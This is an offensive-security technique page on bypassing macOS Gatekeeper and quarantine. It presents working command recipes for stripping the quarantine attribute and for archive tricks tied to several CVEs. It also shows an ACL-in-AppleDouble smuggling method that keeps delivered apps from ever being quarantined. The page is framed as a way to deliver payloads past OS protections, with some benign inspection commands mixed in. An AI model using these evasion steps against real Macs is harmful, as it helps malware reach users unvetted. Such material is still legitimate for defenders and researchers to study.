---
title: "macOS Gatekeeper"
type: technique
tags: [macos, evasion, gatekeeper]
phase: exploitation
date_created: 2026-07-14
date_updated: 2026-07-14
sources: [hacktricks-macos]
---

## Gatekeeper and quarantine bypass

Gatekeeper validates Developer ID signature plus Apple notarization on first launch, but only for files carrying the `com.apple.quarantine` xattr, which is set by the downloading app (browsers, Mail). If a file reaches disk without that xattr, Gatekeeper is never triggered. `spctl` is the CLI front to the `syspolicyd` daemon. On Sequoia 15+, `spctl --master-disable/--global-disable` and right-click Open are removed; policy is now set only via System Settings or an MDM `com.apple.systempolicy.control` profile (see [[macos-mdm]]).

```bash
spctl --status                          # Gatekeeper on/off
spctl --assess -vv /Applications/App.app  # will this app be allowed?
codesign -vv -d /Applications/App.app 2>&1 | grep -E "Authority|TeamIdentifier"
sudo spctl --add --label wl /Applications/App.app && sudo spctl --enable --label wl  # allowlist an app
```

The core bypass is to deliver the payload without the quarantine xattr, or strip it:

```bash
xattr -l app.dmg                                   # inspect: com.apple.quarantine present?
xattr -d com.apple.quarantine /path/to/App.app     # strip it
find . -print0 | xargs -0 xattr -d com.apple.quarantine 2>/dev/null  # strip recursively
```

Archive-based bypass classes (deliver an app that never gets quarantined on extraction):

```bash
# CVE-2022-22616: zip starting from Contents/ so the .app itself never gets the xattr
zip -r test.app/Contents test.zip
# CVE-2022-32910: same idea via Apple Archive
aa archive -d test.app/Contents -o test.app.aar
# CVE-2023-27951: AppleDouble '._' files skip quarantine; nest a DMG behind a symlink
hdiutil create -srcfolder app.app app.dmg
mkdir -p s/app && cp app.dmg s/app/._app.dmg && ln -s ._app.dmg s/app/app.dmg
aa archive -d s/ -o app.aar
```

Check XProtect (Apple's built-in signature scanner) activity:

```bash
log show --last 2h --predicate 'subsystem == "com.apple.XProtectFramework"' --style syslog
```

## xattr and ACL quarantine suppression

The `com.apple.quarantine` xattr is the gate for Gatekeeper, and `com.apple.macl` (a SIP-protected xattr) records TCC user-intent grants from drag-drop or double-click. A powerful Gatekeeper bypass (CVE-2022-42821) exploits that a deny-write ACL prevents the quarantine xattr from being written: package the file with the ACL in AppleDouble format so extraction re-applies the ACL, and the extracted file can never be quarantined.

Inspect and manipulate xattrs:

```bash
xattr file                          # list attr names
xattr -l file                       # list attr names AND values
xattr -w com.apple.custom value f   # write a custom xattr
xattr -d com.apple.quarantine f     # delete quarantine
xattr -c f                          # clear all xattrs
```

The ACL suppression primitive (deny-write ACL blocks xattr writes):

```bash
touch /tmp/no-attr
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/no-attr
xattr -w attrname value /tmp/no-attr   # -> Operation not permitted (quarantine cannot be set either)
```

To smuggle it through an archive, apply the ACL, encode it as an xattr, package as AppleDouble, then rename the xattr to `com.apple.acl.text` so extraction restores the ACL:

```bash
chmod +a "everyone deny write,writeattr,writeextattr" app/test
ditto -c -k app protected.zip
# in the AppleDouble '._' file, rename the smuggled xattr key to com.apple.acl.text, then re-zip
ditto -x -k --rsrc protected.zip .   # extraction re-applies the deny ACL -> no quarantine possible
```

Read a `com.apple.macl` TCC user-intent record; it survives copy but is cleared by zip then delete then unzip:

```bash
xattr Desktop/private.txt   # shows com.apple.macl if a grant exists
```
